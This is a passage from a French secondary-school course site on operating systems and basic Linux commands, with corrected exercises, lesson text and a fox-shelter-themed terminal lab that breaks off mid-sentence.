l'utilisateur          \u2192 Voir la correction          Commandes :  1. pwd 2. ls 3. cd Documents 4. cd .. 5. cd / 6. cd ~ ou cd /home/user                  Introduction \ud83e\udd8a Exercice 5 - Manipulation de fichiers \u00c9crivez les commandes pour :             1. Cr\u00e9er un fichier vide nomm\u00e9 \"test.txt\"             2. Cr\u00e9er un r\u00e9pertoire \"projet\"             3. Copier test.txt dans le r\u00e9pertoire projet             4. Renommer test.txt en ancien.txt             5. Supprimer le fichier ancien.txt             6. Supprimer le r\u00e9pertoire projet et son contenu          \u2192 Voir la correction          Commandes :  1. touch test.txt 2. mkdir projet 3. cp test.txt projet/ 4. mv test.txt ancien.txt 5. rm ancien.txt 6. rm -r projet                  Moyen \ud83e\udd8a\ud83e\udd8a Exercice 6 - Permissions et propri\u00e9t\u00e9s Analysez cette sortie de ls -l :  -rw-r--r-- 1 alice users 1024 Jan 15 10:30 document.txt drwxr-xr-x 2 alice users 4096 Jan 15 09:15 dossier -rwxr-xr-- 1 bob   admin  512 Jan 14 16:45 script.sh              Questions :             1. Quels sont les types de ces \u00e9l\u00e9ments ?             2. Qui peut lire document.txt ?             3. Qui peut ex\u00e9cuter script.sh ?             4. Quelle commande pour donner tous les droits \u00e0 tous sur document.txt ?          \u2192 Voir la correction          Analyse :                 1. Types :                    \u2022 document.txt : fichier r\u00e9gulier (-)                    \u2022 dossier : r\u00e9pertoire (d)                    \u2022 script.sh : fichier r\u00e9gulier (-)                 2. Lecture document.txt : alice (propri\u00e9taire), users (groupe), tous (autres)                 3. Ex\u00e9cution script.sh : bob (propri\u00e9taire), admin (groupe)                 4. Commande : chmod 777 document.txt              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 7 - Recherche et filtrage \u00c9crivez les commandes pour :             1. Trouver tous les fichiers .txt dans le r\u00e9pertoire courant             2. Chercher le mot \"erreur\" dans le fichier log.txt             3. Afficher les 10 derni\u00e8res lignes de log.txt             4. Compter le nombre de lignes dans un fichier             5. Afficher les processus contenant \"python\"             6. Trouver les fichiers modifi\u00e9s dans les derni\u00e8res 24h          \u2192 Voir la correction          Commandes :  1. find . -name \"*.txt\" 2. grep \"erreur\" log.txt 3. tail -n 10 log.txt 4. wc -l fichier.txt 5. ps aux | grep python 6. find . -mtime -1                  Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 8 - Pipes et redirections Cr\u00e9ez des commandes complexes pour :             1. Lister les fichiers, trier par taille, afficher les 5 plus gros             2. Compter le nombre de processus par utilisateur             3. Sauvegarder la liste des fichiers dans un fichier             4. Chercher \"TODO\" dans tous les fichiers .py et compter les occurrences             5. Afficher les lignes uniques d'un fichier tri\u00e9          \u2192 Voir la correction          Commandes complexes :  1. ls -la | sort -k5 -n | tail -5 2. ps aux | awk '{print $1}' | sort | uniq -c 3. ls -la &gt; liste_fichiers.txt 4. grep -r \"TODO\" *.py | wc -l 5. sort fichier.txt | uniq"},{"location":"premiere/VIII-Systemes_d_exploitation_et_Linux/Fiche_exercices_systemes_linux/#partie-3-gestion-des-processus-et-systeme","title":"\ud83d\udcda Partie 3 : Gestion des processus et syst\u00e8me","text":"Moyen \ud83e\udd8a\ud83e\udd8a Exercice 9 - Surveillance syst\u00e8me Analysez cette sortie de la commande top :  PID  USER  %CPU %MEM COMMAND 1234 alice  25.0  15.2 python script.py 5678 bob    12.5   8.1 firefox 9012 root    5.0   2.3 systemd              Questions :             1. Quel processus consomme le plus de CPU ?             2. Quel processus utilise le plus de m\u00e9moire ?             3. Comment arr\u00eater le processus python ?             4. Que fait le processus systemd ?          \u2192 Voir la correction          Analyse :                 1. Plus de CPU : python script.py (25.0%)                 2. Plus de m\u00e9moire : python script.py (15.2%)                 3. Arr\u00eater python : kill 1234 ou killall python                 4. systemd : Gestionnaire de services syst\u00e8me (processus init moderne)              Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 10 - Scripts et automatisation Cr\u00e9ez un script bash qui :             1. V\u00e9rifie si un r\u00e9pertoire \"backup\" existe             2. Le cr\u00e9e s'il n'existe pas             3. Copie tous les fichiers .txt du r\u00e9pertoire courant vers backup             4. Affiche le nombre de fichiers copi\u00e9s             5. Ajoute la date et l'heure dans un fichier log          \u2192 Voir la correction          Script bash : <pre>\n#!/bin/bash\n\n# V\u00e9rifier et cr\u00e9er le r\u00e9pertoire backup\nif [ ! -d \"backup\" ]; then\n    mkdir backup\n    echo \"R\u00e9pertoire backup cr\u00e9\u00e9\"\nfi\n\n# Compter les fichiers .txt\ncount=$(ls *.txt 2&gt;/dev/null | wc -l)\n\nif [ $count -gt 0 ]; then\n    # Copier les fichiers .txt\n    cp *.txt backup/\n    echo \"$count fichiers .txt copi\u00e9s vers backup\"\nelse\n    echo \"Aucun fichier .txt trouv\u00e9\"\nfi\n\n# Ajouter l'entr\u00e9e dans le log\necho \"$(date): Sauvegarde effectu\u00e9e - $count fichiers\" &gt;&gt; backup.log\n                </pre> Pour ex\u00e9cuter :  chmod +x backup.sh ./backup.sh"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/Cours/Cours_1/","title":"Cours 1","text":"\ud83d\udcda \ud83d\udcbb Introduction aux syst\u00e8mes d'exploitation <p>Comprendre les fondements des syst\u00e8mes d'exploitation modernes</p> \ud83d\udd0d D\u00e9finition \ud83d\udcd6 Qu'est-ce qu'un Syst\u00e8me d'Exploitation ?              Un Syst\u00e8me d'Exploitation (ou Operating System) est un ensemble de programmes qui permettent le fonctionnement et l'orchestration des op\u00e9rations entre les divers composants d'un ordinateur.             Il permet de rendre un ensemble de composants \u00e9lectroniques utilisables pour cr\u00e9er un outil fonctionnel et facile d'usage pour un utilisateur.          \ud83d\udcda Contexte historique \ud83d\udd70\ufe0f L'invention des Syst\u00e8mes d'Exploitation              Les syst\u00e8mes d'exploitation (OS) sont apparus pour simplifier l'utilisation des ordinateurs. Au d\u00e9part, les utilisateurs devaient \u00e9crire des commandes complexes pour interagir avec la machine. Les OS ont \u00e9t\u00e9 con\u00e7us pour g\u00e9rer les t\u00e2ches courantes (lancer des programmes, g\u00e9rer les fichiers, etc.) et permettre une utilisation plus intuitive des ordinateurs.          \ud83d\udd13 Types de syst\u00e8mes \ud83d\udc27 Syst\u00e8me Libre                  Logiciel dont le code source est accessible \u00e0 tous. Il peut \u00eatre modifi\u00e9 et partag\u00e9 librement. Exemples : Linux, FreeBSD, OpenBSD              \ud83d\udd12 Syst\u00e8me Propri\u00e9taire                  Logiciel dont le code source est ferm\u00e9. Il ne peut \u00eatre utilis\u00e9 ou modifi\u00e9 qu'avec l'autorisation de l'entreprise qui le vend. Exemples : Windows, macOS, iOS              \ud83d\udd27 Composants d'un SE \ud83d\udcd6 Architecture d'un syst\u00e8me d'exploitation              Un syst\u00e8me d'exploitation est compos\u00e9 de plusieurs \u00e9l\u00e9ments qui travaillent ensemble pour assurer le bon fonctionnement de l'ordinateur.          \u2699\ufe0f Le noyau (Kernel)              Le Noyau (ou kernel) est le c\u0153ur du syst\u00e8me d'exploitation.             Il est responsable de plusieurs t\u00e2ches bien pr\u00e9cises :              \ud83e\udde0 Gestion de la m\u00e9moire Allocation et lib\u00e9ration de la m\u00e9moire pour les programmes \ud83d\udd0c Communication mat\u00e9rielle Interface entre logiciels et composants physiques \u23f1\ufe0f Ordonnancement des t\u00e2ches Gestion de l'ex\u00e9cution des processus et programmes \ud83d\udd04 Mission notable : La traduction             Le Syst\u00e8me d'Exploitation permet de traduire le langage binaire compr\u00e9hensible par les diff\u00e9rents composants de l'ordinateur en mn\u00e9moniques ou instructions intelligibles par l'utilisateur gr\u00e2ce au langage Assembleur. D\u00e9finition : On appelle mn\u00e9monique un ensemble de caract\u00e8res associ\u00e9 \u00e0 une op\u00e9ration r\u00e9alisable par un des composants de l'ordinateur.          \ud83d\udca1 Anecdote Le mot kernel vient de l'anglais qui est la traduction de cerneau, la partie comestible de la noix. \ud83d\udcc2 Le syst\u00e8me de fichiers \ud83d\udcd6 Organisation des fichiers              Le syst\u00e8me de fichiers est une m\u00e9thode de gestion et d'organisation des diff\u00e9rents fichiers. Il permet de classer les fichiers pour que leur utilisation et leur acc\u00e8s soient plus faciles pour l'utilisateur ET pour le mat\u00e9riel.             La structure des syst\u00e8mes de fichiers est g\u00e9n\u00e9ralement arborescente, ce qui est naturellement adopt\u00e9 lors de la structuration de dossiers.          \ud83c\udf33 Structure hi\u00e9rarchique              On d\u00e9finit la racine qui correspond (curieusement) au sommet de l'arborescence. Elle contient tous les fichiers et r\u00e9pertoires du syst\u00e8me. Elle comprend aussi l'ensemble des r\u00e9pertoires n\u00e9cessaires au fonctionnement des p\u00e9riph\u00e9riques et des composants.             On d\u00e9finit un syst\u00e8me de hi\u00e9rarchie des fichiers et des r\u00e9pertoires pour permettre de s'y rep\u00e9rer plus facilement.             Cependant on retrouve une diff\u00e9rence entre les kernels.          \ud83d\udc27 Syst\u00e8me UNIX Arborescence d'un syst\u00e8me UNIX <pre>/                   (Racine)\n\u251c\u2500\u2500 home            (Dossier utilisateurs)\n\u2502   \u251c\u2500\u2500 utilisateur1\n\u2502   \u2502   \u251c\u2500\u2500 Documents\n\u2502   \u2502   \u251c\u2500\u2500 Images\n\u2502   \u2502   \u2514\u2500\u2500 Musique\n\u2502   \u2514\u2500\u2500 utilisateur2\n\u251c\u2500\u2500 etc             (Configurations syst\u00e8me)\n\u2514\u2500\u2500 var             (Donn\u00e9es variables)</pre> \ud83e\ude9f Syst\u00e8me MS-DOS (Windows) Arborescence d'un syst\u00e8me Windows <pre>C:\\                   (Racine du lecteur principal)\n\u251c\u2500\u2500 Users             (Dossier des utilisateurs)\n\u2502   \u251c\u2500\u2500 Administrateur\n\u2502   \u2502   \u251c\u2500\u2500 Bureau        (Fichiers sur le bureau)\n\u2502   \u2502   \u251c\u2500\u2500 Documents     (Fichiers personnels)\n\u2502   \u2502   \u251c\u2500\u2500 T\u00e9l\u00e9chargements\n\u2502   \u2502   \u251c\u2500\u2500 Images\n\u2502   \u2502   \u2514\u2500\u2500 Musique\n\u2502   \u2514\u2500\u2500 Utilisateur1\n\u2502       \u251c\u2500\u2500 Bureau\n\u2502       \u251c\u2500\u2500 Documents\n\u2502       \u251c\u2500\u2500 T\u00e9l\u00e9chargements\n\u2502       \u251c\u2500\u2500 Images\n\u2502       \u2514\u2500\u2500 Musique\n\u251c\u2500\u2500 Windows           (Fichiers syst\u00e8me)\n\u2502   \u251c\u2500\u2500 System32\n\u2502   \u251c\u2500\u2500 Temp\n\u2502   \u2514\u2500\u2500 Drivers\n\u251c\u2500\u2500 Program Files     (Programmes install\u00e9s)\n\u2502   \u251c\u2500\u2500 Microsoft Office\n\u2502   \u251c\u2500\u2500 Google\n\u2502   \u2514\u2500\u2500 Adobe\n\u2514\u2500\u2500 Program Files (x86)  (Programmes 32 bits)\n    \u251c\u2500\u2500 Jeux\n    \u2514\u2500\u2500 Logiciels obsol\u00e8tes</pre> \ud83d\udd11 Permissions \ud83d\udcd6 Gestion des droits utilisateurs              Le Syst\u00e8me d'Exploitation est organis\u00e9 par utilisateurs. Chaque utilisateur n'a pas les m\u00eames droits sur tous les fichiers de l'ordinateur. On appelle tous ces droits des permissions. Elles sont accord\u00e9es suivant le niveau de l'utilisateur.          \ud83d\udc51 Super-utilisateurs              Il existe dans ces deux mod\u00e8les un super-utilisateur qui poss\u00e8de tous les droits :             \u2022 sudo pour les syst\u00e8mes UNIX             \u2022 Administrateur pour les syst\u00e8mes MS-DOS             Ces permissions doivent \u00eatre accord\u00e9es \u00e0 chacun des fichiers et peuvent \u00eatre modifi\u00e9es plus ou moins facilement suivant le syst\u00e8me utilis\u00e9 (UNIX \u00e9tant beaucoup plus permissif).          \ud83d\udd10 Mod\u00e8le UGO (UNIX)             On parle de mod\u00e8le UGO pour le mod\u00e8le UNIX : User / Group / Other.             Ces permissions peuvent \u00eatre attribu\u00e9es \u00e0 l'aide de commandes \u00e9crites dans le terminal (invite de commande). Il existe 3 types de permissions :             \u2022 Lecture (Reading)             \u2022 \u00c9criture (Writing)             \u2022 Ex\u00e9cution (eXecute)             On parle de permissions RWX, on verra comment les modifier dans le cours suivant.          \ud83d\udda5\ufe0f Les interfaces utilisateur \ud83d\udcd6 Qu'est-ce qu'une interface ?              L'interface (ou shell) permet \u00e0 l'utilisateur d'interagir avec l'ordinateur et pouvoir l'utiliser facilement.          \ud83d\udca1 Anecdote On parle de shell qui signifie coquille ou coque en anglais, reprenant le mod\u00e8le de noix. L'interface correspond donc \u00e0 la partie la plus externe du Syst\u00e8me. \ud83d\udd04 Diversit\u00e9 des interfaces              Il existe diff\u00e9rentes interfaces utilisables par l'utilisateur qui ont chacune leurs avantages.          \ud83d\udcbb Interface en ligne de commande (CLI)                  L'Interface en ligne de commande \u00e9tait le premier choix pour permettre \u00e0 l'utilisateur d'interagir avec l'ordinateur.                 Cette interface peut para\u00eetre archa\u00efque (ou moins intuitive) mais elle est de loin la plus efficace et la moins \u00e9nergivore pour la machine.                 L'avantage le plus important est la rapidit\u00e9 du syst\u00e8me qui ne doit g\u00e9rer l'affichage que de simples caract\u00e8res de couleur sur un fond uni plut\u00f4t que de g\u00e9rer des fen\u00eatres d'ex\u00e9cution ou de contexte.                                  L'utilisation de ce genre d'interface n'est plus que r\u00e9serv\u00e9e \u00e0 l'acc\u00e8s \u00e0 distance \u00e0 des serveurs ou de machines d\u00e9di\u00e9es \u00e0 de simples usages.              \ud83d\uddbc\ufe0f Interface Graphique (GUI)                  Interface visuelle utilisable facilement gr\u00e2ce \u00e0 des visuels pratiques. Microsoft a introduit le syst\u00e8me de fen\u00eatre qui a \u00e9t\u00e9 popularis\u00e9 dans la fin des ann\u00e9es 80's - d\u00e9but des ann\u00e9es 90's.                 L'avantage notable de l'Interface Graphique (ou GUI pour Graphic User Interface) est qu'elle est beaucoup plus pratique pour les utilisateurs lambda.                 Le probl\u00e8me des interfaces graphiques est la gestion des diff\u00e9rents styles \u00e0 adopter qui peuvent \u00eatre gourmandes en ressources.                 Ces interfaces ont \u00e9volu\u00e9 avec les avanc\u00e9es technologiques et l'\u00e9volution du design au cours du temps.                  \ud83d\udca1 Anecdotes historiques Windows : Microsoft a nomm\u00e9 Windows la version \u00e9volu\u00e9e de son Syst\u00e8me MS-DOS car il introduisait la notion de fen\u00eatre (window en anglais). Windows Vista : \u00e9tait un Syst\u00e8me d'Exploitation controvers\u00e9. Son design \u00e9tait r\u00e9volutionnaire avec la technologie Aero mais elle \u00e9tait tellement \u00e9nergivore qu'elle ralentissait consid\u00e9rablement la machine.          <p> </p>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/Cours/Cours_2/","title":"Cours 2","text":"Commandes Linux essentielles \ud83d\udcda \ud83d\udda5\ufe0f Commandes Linux essentielles \ud83d\udcc1 Navigation dans les r\u00e9pertoires \ud83d\udcd6 Commandes de navigation              Les commandes de navigation permettent de se d\u00e9placer dans l'arborescence du syst\u00e8me de fichiers et d'explorer son contenu.          pwd Affiche le r\u00e9pertoire courant (Print Working Directory) ls Liste le contenu du r\u00e9pertoire ls -l Affiche les d\u00e9tails (permissions, taille, date) ls -a Affiche les fichiers cach\u00e9s cd Change de r\u00e9pertoire (Change Directory) cd .. Remonte d'un niveau cd ~ Retourne au r\u00e9pertoire personnel cd /chemin/vers/dossier Va dans un dossier sp\u00e9cifique \ud83d\udcdd Manipulation des fichiers \ud83d\udcd6 Gestion des fichiers et dossiers              Les commandes de manipulation permettent de cr\u00e9er, copier, d\u00e9placer et supprimer des fichiers et dossiers dans le syst\u00e8me.          touch Cr\u00e9e un fichier vide touch fichier.txt mkdir Cr\u00e9e un nouveau dossier mkdir dossier cp Copie un fichier ou dossier cp source destination Copie un fichier cp -r dossier1 dossier2 Copie un dossier et son contenu mv D\u00e9place ou renomme un fichier/dossier mv ancien nouveau Renomme un fichier/dossier mv ancienne nouvelle D\u00e9place un fichier/dossier rm Supprime un fichier ou dossier rm fichier Supprime un fichier rm -r dossier Supprime un dossier et son contenu \ud83d\udc40 Affichage et \u00e9dition \ud83d\udcd6 Consultation des fichiers              Les commandes d'affichage permettent de visualiser le contenu des fichiers sans les modifier.          cat Affiche le contenu d'un fichier cat fichier \ud83d\udc65 Gestion des droits \ud83d\udcd6 Syst\u00e8me de permissions              Les permissions contr\u00f4lent qui peut lire, \u00e9crire ou ex\u00e9cuter un fichier. Elles sont essentielles pour la s\u00e9curit\u00e9 du syst\u00e8me.          chmod Modifie les permissions d'un fichier chmod +x fichier Rend un fichier ex\u00e9cutable chmod 755 fichier Donne les droits rwx au propri\u00e9taire, rx aux autres \ud83d\udd10 Structure des permissions rwxrwxrwx :             \u2022 1er <code>rwx</code> pour le propri\u00e9taire (user)             \u2022 2e <code>rwx</code> pour le groupe (group)             \u2022 3e <code>rwx</code> pour les autres (others)          Permission Signification 0Aucune permission 1Ex\u00e9cution 2\u00c9criture 3\u00c9criture et ex\u00e9cution 4Lecture 5Lecture et ex\u00e9cution 6Lecture et \u00e9criture 7Lecture, \u00e9criture et ex\u00e9cution \ud83c\udf10 Connexion SSH \ud83d\udcd6 Acc\u00e8s distant s\u00e9curis\u00e9              SSH (Secure Shell) permet de se connecter \u00e0 distance \u00e0 un serveur de mani\u00e8re s\u00e9curis\u00e9e et d'ex\u00e9cuter des commandes ou transf\u00e9rer des fichiers.          ssh Se connecte \u00e0 un serveur distant ssh utilisateur@serveur scp Copie un fichier vers un serveur distant scp fichier utilisateur@serveur:/chemin \ud83d\udcbb Exemples pratiques ssh student@10.10.12.137 Se connecter au serveur avec l'utilisateur \"student\" scp devoir.py student@10.10.12.137:/home/student Copier le fichier \"devoir.py\" vers le dossier personnel de l'utilisateur \ud83d\udccb R\u00e9capitulatif des commandes essentielles \ud83c\udfaf Points cl\u00e9s \u00e0 retenir :             \u2022 Navigation : <code>pwd</code>, <code>ls</code>, <code>cd</code> pour explorer le syst\u00e8me             \u2022 Manipulation : <code>touch</code>, <code>mkdir</code>, <code>cp</code>, <code>mv</code>, <code>rm</code> pour g\u00e9rer les fichiers             \u2022 Affichage : <code>cat</code> pour consulter le contenu             \u2022 Permissions : <code>chmod</code> pour s\u00e9curiser l'acc\u00e8s             \u2022 SSH : <code>ssh</code> et <code>scp</code> pour l'acc\u00e8s distant             Ces commandes forment la base de l'administration syst\u00e8me Linux."},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/TP_commandes_linux/","title":"TP commandes linux","text":"TP : Commandes Linux - Refuge de Renards \ud83e\udd8a TP : Commandes Linux - Refuge de Renards <p>Apprentissage pratique des commandes de base du terminal Linux</p> \ud83c\udfaf Contexte de la mission              Vous travaillez pour un refuge de renards qui souhaite organiser et sauvegarder toutes les donn\u00e9es concernant les diff\u00e9rentes esp\u00e8ces de renards du genre Vulpes. Votre mission est d'apprendre \u00e0 utiliser les commandes de base du terminal Linux pour cr\u00e9er une structure de fichiers organis\u00e9e.          \ud83d\udda5\ufe0f Votre environnement de travail              Votre carte OrangePi affiche un nom d'esp\u00e8ce de renard stylis\u00e9 de la forme :          <pre>\n\n               \"\"#                                              \"\"#                        \n m   m  m   m    #    mmmm    mmm    mmm          m   m  m   m    #    mmmm    mmm    mmm  \n \"m m\"  #   #    #    #\" \"#  #\"  #  #   \"         \"m m\"  #   #    #    #\" \"#  #\"  #  #   \" \n  #m#   #   #    #    #   #  #\"\"\"\"   \"\"\"m          #m#   #   #    #    #   #  #\"\"\"\"   \"\"\"m \n   #    \"mm\"#    \"mm  ##m#\"  \"#mm\"  \"mmm\"           #    \"mm\"#    \"mm  ##m#\"  \"#mm\"  \"mmm\" \n                      #                                                #                   \n                      \"                                                \"                   \n</pre> \ud83d\udcdd Important : Cette esp\u00e8ce est celle sur laquelle vous allez travailler. Si votre esp\u00e8ce n'est pas renseign\u00e9e, choisissez celle que vous voulez dans les annexes.      \ud83e\udded Partie 1 : Navigation de base 1.1 D\u00e9couverte de votre position \ud83c\udfaf Objectif              Apprendre \u00e0 se rep\u00e9rer dans l'arborescence du syst\u00e8me de fichiers Linux et \u00e0 lister le contenu des r\u00e9pertoires.          \ud83d\udccd pwd - Print Working Directory Affiche le r\u00e9pertoire courant (o\u00f9 vous vous trouvez) \ud83d\udcbb Commande <pre># Afficher votre r\u00e9pertoire courant\npwd</pre> \ud83d\udcc2 ls - List Liste le contenu du r\u00e9pertoire courant \ud83d\udcbb Commandes <pre># Lister le contenu du r\u00e9pertoire courant\nls\n\n# Afficher le contenu d\u00e9taill\u00e9\nls -l\n\n# Afficher tous les fichiers (y compris cach\u00e9s)\nls -la</pre> 1.2 Navigation dans l'arborescence \ud83c\udfaf Objectif              Apprendre \u00e0 se d\u00e9placer dans l'arborescence du syst\u00e8me de fichiers avec la commande <code>cd</code>.          \ud83c\udfe0 cd - Change Directory Permet de changer de r\u00e9pertoire \ud83d\udcbb Navigation de base <pre># Aller dans le r\u00e9pertoire racine\ncd /\n\n# V\u00e9rifier votre position\npwd\n\n# Lister le contenu\nls</pre> \ud83c\udfe1 Retour au r\u00e9pertoire personnel Diff\u00e9rentes fa\u00e7ons de revenir \u00e0 votre dossier utilisateur \ud83d\udcbb Retour home <pre># Retourner dans votre r\u00e9pertoire personnel\ncd ~\n# ou\ncd\n\n# V\u00e9rifier votre position\npwd</pre> \ud83c\udfd7\ufe0f Partie 2 : Cr\u00e9ation de la structure du refuge 2.1 Cr\u00e9ation du r\u00e9pertoire principal \ud83c\udfaf Objectif              Cr\u00e9er le r\u00e9pertoire principal qui contiendra toute l'organisation du refuge de renards.          \ud83d\udcc1 mkdir - Make Directory Cr\u00e9er un nouveau r\u00e9pertoire \ud83d\udcbb Cr\u00e9ation et navigation <pre># Cr\u00e9er le r\u00e9pertoire principal du refuge\nmkdir refuge_renards\n\n# Entrer dans ce r\u00e9pertoire\ncd refuge_renards\n\n# V\u00e9rifier votre position\npwd</pre> 2.2 Cr\u00e9ation de la structure des esp\u00e8ces \ud83c\udfaf Objectif              Cr\u00e9er la structure suivante pour organiser les donn\u00e9es du refuge :          \ud83d\uddc2\ufe0f Structure organisationnelle Cr\u00e9er les r\u00e9pertoires principaux du refuge \ud83d\udcbb Cr\u00e9ation des dossiers <pre># Cr\u00e9er les r\u00e9pertoires principaux\nmkdir nom_de_l_espece\nmkdir sauvegardes\nmkdir documentation\n\n# V\u00e9rifier la cr\u00e9ation\nls -l</pre> 2.3 Organisation des esp\u00e8ces \ud83c\udfaf Objectif              Naviguer dans le r\u00e9pertoire de votre esp\u00e8ce pour commencer l'organisation des donn\u00e9es.          \ud83e\udd8a Navigation vers l'esp\u00e8ce Entrer dans le r\u00e9pertoire de votre esp\u00e8ce \ud83d\udcbb Navigation <pre># Entrer dans le r\u00e9pertoire especes\ncd nom_de_l_espece\n\n# V\u00e9rifier la cr\u00e9ation\nls</pre> \ud83d\udcc4 Partie 3 : Cr\u00e9ation de fichiers de donn\u00e9es 3.1 Fichiers d'information pour chaque esp\u00e8ce \ud83c\udfaf Objectif              Cr\u00e9er les fichiers de donn\u00e9es n\u00e9cessaires pour documenter chaque esp\u00e8ce de renard.          \ud83d\udcdd touch - Cr\u00e9er des fichiers Cr\u00e9er les fichiers de donn\u00e9es pour votre esp\u00e8ce \ud83d\udcbb Cr\u00e9ation des fichiers <pre># Exemple pour le renard roux\ncd renard_roux\n\n# Cr\u00e9er les fichiers de donn\u00e9es\ntouch informations_generales.txt\ntouch habitat.txt\ntouch alimentation.txt\ntouch reproduction.txt\ntouch statut_conservation.txt\n\n# V\u00e9rifier la cr\u00e9ation\nls -l</pre> 3.2 Ajout de contenu avec vim \ud83c\udfaf Objectif              Apprendre \u00e0 utiliser l'\u00e9diteur de texte vim pour ajouter du contenu aux fichiers.          \u270f\ufe0f vim - \u00c9diteur de texte Ouvrir et \u00e9diter un fichier avec vim \ud83d\udcbb Ouverture du fichier <pre># Ouvrir le fichier informations_generales.txt\nvim informations_generales.txt</pre> \u26a0\ufe0f IMPORTANT - Comment sortir de vim <ol> <li>Appuyer sur <code>Esc</code> pour vous assurer d'\u00eatre en mode commande</li> <li>Taper <code>:q</code> pour quitter sans sauvegarder</li> <li>Taper <code>:wq</code> pour sauvegarder et quitter</li> <li>Taper <code>:q!</code> pour forcer la sortie sans sauvegarder</li> </ol> 3.3 V\u00e9rification du contenu avec cat \ud83c\udfaf Objectif              Apprendre \u00e0 afficher le contenu des fichiers avec la commande <code>cat</code>.          \ud83d\udc41\ufe0f cat - Afficher le contenu Diff\u00e9rentes fa\u00e7ons d'afficher le contenu des fichiers \ud83d\udcbb Affichage des fichiers <pre># Afficher le contenu du fichier informations_generales.txt\ncat informations_generales.txt\n\n# Afficher le contenu de tous les fichiers d'un coup\ncat *.txt\n\n# Afficher le contenu avec les num\u00e9ros de ligne\ncat -n informations_generales.txt</pre> \ud83d\udd0d Partie 4 : Exploration avanc\u00e9e avec ls 4.1 Options utiles de ls \ud83c\udfaf Objectif              D\u00e9couvrir les options avanc\u00e9es de la commande <code>ls</code> pour explorer efficacement l'arborescence.          \ud83d\udcca ls -lh - Listage lisible Affichage d\u00e9taill\u00e9 avec tailles lisibles \ud83d\udcbb Navigation et listage <pre># Retourner dans le r\u00e9pertoire principal du refuge\ncd ~/refuge_renards\n\n# Listage d\u00e9taill\u00e9\nls -lh</pre> \ud83c\udf33 ls -R - Listage r\u00e9cursif Afficher tout le contenu de l'arborescence \ud83d\udcbb Exploration r\u00e9cursive <pre># Listage r\u00e9cursif (attention, peut \u00eatre long !)\nls -R especes/</pre> \ud83d\udcc5 Tri par date et taille Options de tri avanc\u00e9es \ud83d\udcbb Tris sp\u00e9cialis\u00e9s <pre># Listage tri\u00e9 par date de modification\nls -lt\n\n# Listage tri\u00e9 par taille\nls -lS</pre> \ud83d\udd17 Partie 5 : Liens symboliques et relatifs 5.1 Cr\u00e9ation de liens symboliques \ud83c\udfaf Objectif              Apprendre \u00e0 cr\u00e9er des raccourcis (liens symboliques) vers des r\u00e9pertoires fr\u00e9quemment utilis\u00e9s.          \ud83d\udd17 ln -s - Lien symbolique Cr\u00e9er un raccourci vers un r\u00e9pertoire \ud83d\udcbb Cr\u00e9ation et test du lien <pre># Cr\u00e9er un lien symbolique vers le r\u00e9pertoire des esp\u00e8ces\nln -s especes/ acces_rapide_especes\n\n# V\u00e9rifier la cr\u00e9ation\nls -l\n\n# Tester le lien\ncd acces_rapide_especes\npwd\nls</pre> 5.2 Chemins relatifs vs absolus \ud83c\udfaf Objectif              Comprendre la diff\u00e9rence entre chemins relatifs et absolus pour naviguer efficacement.          \ud83e\udded Navigation relative Utiliser des chemins relatifs pour se d\u00e9placer \ud83d\udcbb Chemins relatifs <pre># Retourner au r\u00e9pertoire principal\ncd ~/refuge_renards\n\n# Chemin relatif\ncd especes/renard_roux\npwd\n\n# Retour avec chemin relatif\ncd ../../\npwd</pre> \ud83d\udd10 Partie 6 : Gestion des permissions avec chmod 6.1 Comprendre les permissions \ud83c\udfaf Objectif              Ma\u00eetriser la gestion des permissions de fichiers et r\u00e9pertoires sous Linux.          \ud83d\udc41\ufe0f Affichage des permissions Visualiser les permissions d\u00e9taill\u00e9es \ud83d\udcbb Commandes <pre># Afficher les permissions d\u00e9taill\u00e9es\ncd ~/refuge_renards/especes/renard_roux\nls -l</pre> \ud83d\udccb Lecture des permissions rwxrwxrwx : <ul> <li>1er <code>rwx</code> pour le propri\u00e9taire (user)</li> <li>2e <code>rwx</code> pour le groupe (group)</li> <li>3e <code>rwx</code> pour les autres (others)</li> </ul> Permission Signification 0 Aucune permission 1 Ex\u00e9cution 2 \u00c9criture 3 \u00c9criture et ex\u00e9cution 4 Lecture 5 Lecture et ex\u00e9cution 6 Lecture et \u00e9criture 7 Lecture, \u00e9criture et ex\u00e9cution 6.2 Modification des permissions \ud83d\udd12 Lecture seule pour tous Rendre un fichier accessible en lecture uniquement \ud83d\udcbb Commandes <pre># Rendre un fichier accessible en lecture seule pour tous\nchmod 444 informations_generales.txt\nls -l informations_generales.txt</pre> \ud83d\udc64 Propri\u00e9taire uniquement Lecture/\u00e9criture pour le propri\u00e9taire seulement \ud83d\udcbb Commandes <pre># Rendre un fichier accessible en lecture/\u00e9criture pour le propri\u00e9taire uniquement\nchmod 600 habitat.txt\nls -l habitat.txt</pre> \u26a1 Fichier ex\u00e9cutable Ajouter la permission d'ex\u00e9cution \ud83d\udcbb Commandes <pre># Rendre un fichier ex\u00e9cutable\nchmod +x alimentation.txt\nls -l alimentation.txt</pre> \ud83d\udeab Retirer des permissions Supprimer l'\u00e9criture pour groupe et autres \ud83d\udcbb Commandes <pre># Retirer les permissions d'\u00e9criture pour le groupe et les autres\nchmod go-w reproduction.txt\nls -l reproduction.txt</pre> \ud83d\uddd1\ufe0f Partie 7 : Suppression et nettoyage 7.1 Suppression de fichiers \ud83c\udfaf Objectif              Apprendre \u00e0 supprimer des fichiers de mani\u00e8re s\u00e9curis\u00e9e et v\u00e9rifier les suppressions.          \ud83d\uddd1\ufe0f rm - Suppression de fichier Cr\u00e9er, supprimer et v\u00e9rifier \ud83d\udcbb Test de suppression <pre># Cr\u00e9er un fichier temporaire\ntouch fichier_temporaire.txt\n\n# Supprimer-le\nrm fichier_temporaire.txt\n\n# V\u00e9rifier qu'il a \u00e9t\u00e9 supprim\u00e9\nls</pre> 7.2 Suppression de r\u00e9pertoires \u26a0\ufe0f ATTENTION <code>rm -rf</code> supprime d\u00e9finitivement et r\u00e9cursivement. Utiliser avec pr\u00e9caution !          \ud83d\udcc1 Test de suppression de r\u00e9pertoire Cr\u00e9er, tester et supprimer un r\u00e9pertoire \ud83d\udcbb Suppression de r\u00e9pertoire <pre># Cr\u00e9er un r\u00e9pertoire de test avec des 